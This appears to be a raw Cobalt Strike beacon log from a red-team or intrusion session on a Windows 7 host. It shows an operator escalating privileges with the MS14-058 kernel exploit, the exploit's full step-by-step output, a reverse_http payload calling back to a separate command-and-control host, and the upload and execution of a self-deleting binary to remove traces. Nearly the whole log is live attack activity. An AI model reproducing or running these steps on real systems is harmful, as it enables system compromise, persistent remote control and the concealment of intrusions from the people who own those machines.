02/08 09:34:31 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 1508; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/08 09:34:49 [input] <neo> elevate ms14-058 test
02/08 09:34:49 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/08 09:35:28 [checkin] host called home, sent: 104503 bytes
02/08 09:35:29 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c07000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F5A1FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F5D9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C30835D0
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/08 10:29:17 [task] 自删除
02/08 10:29:17 [task] Tasked beacon to make directory c:\RedTeam\
02/08 10:29:17 [task] cd c:\RedTeam\
02/08 10:29:18 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\SelfDelete.exe as SelfDelete.exe
02/08 10:29:18 [indicator] file: 532de23bac2841e4759b8be2af137738 160256 bytes SelfDelete.exe
02/08 10:29:18 [task] Tasked beacon to execute: C:\redteam\SelfDelete.exe
02/08 10:29:33 [checkin] host called home, sent: 160353 bytes
